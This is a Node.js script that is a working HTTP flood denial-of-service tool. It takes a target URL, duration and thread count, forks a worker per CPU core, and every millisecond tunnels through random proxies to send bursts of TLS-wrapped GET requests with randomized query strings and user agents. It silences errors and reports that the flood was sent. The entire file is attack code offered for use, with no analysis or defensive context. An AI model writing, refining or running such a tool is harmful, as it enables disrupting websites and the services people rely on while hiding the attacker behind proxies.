const net = require('net');
const fs = require('fs');
const url = require('url');
const request_2 = require('request');
const crypto = require('crypto');
var colors = require('colors');
var theJar = request_2.jar();
const path = require("path");
const { cpus } = require('os');
const http = require('http');
const tls = require('tls');
const execSync = require('child_process').execSync;
const cluster = require('cluster');

//Coming soon...
var cookies = {};

var VarsDefinetions = {
  Objetive: process.argv[2],
  time: process.argv[3],
  rate: process.argv[4]
}

if (process.argv.length !== 5) {
  console.log(`                       
Usage: node ${path.basename(__filename)} <Target> <Time> <Threads>
Usage: node ${path.basename(__filename)} <http://example.com> <60> <30>
------------------------------------------------------------------
Dependencies: user-agents.txt (User Agents) | proxies.txt (Proxies)
`);
  process.exit(0);
}

var fileName = __filename;
var file = path.basename(fileName);

// safe read and trim empty lines
var proxies = fs.readFileSync('proxies.txt', 'utf-8').toString().replace(/\r/g, '').split('\n').map(s => s.trim()).filter(Boolean);
var UAs = fs.readFileSync('user-agents.txt', 'utf-8').replace(/\r/g, '').split('\n').map(s => s.trim()).filter(Boolean);

process.on('uncaughtException', function() {});
process.on('unhandledRejection', function() {});
require('events').EventEmitter.defaultMaxListeners = Infinity;

function getRandomNumberBetween(min,max){
  return Math.floor(Math.random()*(max-min+1)+min);
}
function RandomString(length) {
  var result           = '';
  var characters       = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
  var charactersLength = characters.length;
  for ( var i = 0; i < length; i++ ) {
     result += characters.charAt(Math.floor(Math.random() * charactersLength));
  }
  return result;
}
var parsed = url.parse(VarsDefinetions.Objetive);
process.setMaxListeners(15);
let browser_saves = '';

const numCPUs = cpus().length;
if (cluster.isPrimary) {

  for (let i = 0; i < numCPUs; i++) {
    cluster.fork();
  }

  cluster.on('exit', (worker, code, signal) => {
  });
} else {

function BuildRequest() {
  let reqPath = parsed.path || '/';
  if (reqPath.indexOf("[rand]") !== -1){
      reqPath = reqPath.replace(/\[rand\]/g, RandomString(getRandomNumberBetween(5,16)));
  }
  var raw_socket = 'GET' + ' ' + reqPath + '?query=' + RandomString(getRandomNumberBetween(1,24)) + ' HTTP/1.1\r\n' +
    'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n' +
    'Upgrade-Insecure-Requests: 1\r\n' +
    'Host: ' + parsed.host + '\r\n' +
    'User-Agent: ' + UAs[Math.floor(Math.random() * UAs.length)] + '\r\n' +
    'Accept-Language: en-us\r\n' +
    'Accept-Encoding: gzip, deflate, br\r\n' +
    'Connection: keep-alive\r\n\r\n'
  return raw_socket;
}

setInterval(function() {

  // choose random proxy safely
  if (!proxies.length) return;
  var proxyLine = proxies[Math.floor(Math.random() * proxies.length)];
  if (!proxyLine) return;
  var proxy = proxyLine.split(':');
  if (proxy.length < 2) return;

  const agent = new http.Agent({
    keepAlive: true,
    keepAliveMsecs: 50000,
    maxSockets: Infinity,
  });

  var req = http.request({
    host: proxy[0],
    agent: agent,
    globalAgent: agent,
    port: proxy[1],
    method: 'CONNECT',
    path: parsed.host + ':443',
    headers: {
      'Host': parsed.host + ':443',
      'Proxy-Connection': 'keep-alive',
      'Connection': 'keep-alive',
    }
  });

  req.on('connect', function (res, socket, head) {
    // do not modify module object 'tls'
    // start TLS over the connected socket — use socket and servername
    // use secureOptions from crypto.constants
    const secureOptions = crypto.constants.SSL_OP_NO_SSLv2 |
      crypto.constants.SSL_OP_NO_SSLv3 |
      crypto.constants.SSL_OP_NO_TLSv1 |
      crypto.constants.SSL_OP_NO_TLSv1_1 |
      crypto.constants.SSL_OP_NO_TLSv1_3 |
      crypto.constants.ALPN_ENABLED |
      crypto.constants.SSL_OP_ALLOW_UNSAFE_LEGACY_RENEGOTIATION |
      crypto.constants.SSL_OP_CIPHER_SERVER_PREFERENCE |
      crypto.constants.SSL_OP_SINGLE_DH_USE |
      crypto.constants.SSL_OP_SINGLE_ECDH_USE;

    var TlsConnection = tls.connect({
      socket: socket,
      servername: parsed.host,
      rejectUnauthorized: false,
      secureOptions: secureOptions,
      minVersion: 'TLSv1.2',
      maxVersion: 'TLSv1.3',
      // ciphers can be left default or provided as a string
      ciphers: 'TLS_AES_256_GCM_SHA384:TLS_CHACHA20_POLY1305_SHA256:TLS_AES_128_GCM_SHA256',
    }, function () {
      // write requests after TLS handshake completes
      try {
        for (let j = 0; j < Number(VarsDefinetions.rate); j++) {
          if (!TlsConnection.writable) break;
          TlsConnection.setKeepAlive(true, 10000);
          TlsConnection.setTimeout(10000);
          var r = BuildRequest();
          TlsConnection.write(r);
        }
      } catch (e) {
        // ignore per original design
      }
    });

    TlsConnection.setNoDelay(true);
    TlsConnection.setKeepAlive(true, 10000);
    TlsConnection.setTimeout(15000);
    TlsConnection.setMaxListeners(0);

    TlsConnection.on('timeout' , () => {
      try { TlsConnection.destroy(); } catch(e){}
    });

    TlsConnection.on('error', (err) =>{
      try { TlsConnection.destroy(); } catch(e){}
    });

    TlsConnection.on('data', (chunk) => {
      // close after first data for this implementation
      setTimeout(function () {
        try { TlsConnection.end(); } catch(e){}
      }, 10000);
    });

    TlsConnection.on('end', () => {
      try { TlsConnection.end(); } catch(e){}
    });

  });

  req.on('error', () => {
    // ignore proxy errors
  });

  req.end();
}, 1); // tiny delay to avoid tight loop
}

setTimeout(() => {
  console.log('\nHTTP QUERY flood sent for ' + process.argv[3] + ' seconds with ' + process.argv[4] + ' threads! Target: ' + process.argv[2] + '\n')
  process.exit(1);
}, VarsDefinetions.time*1000);
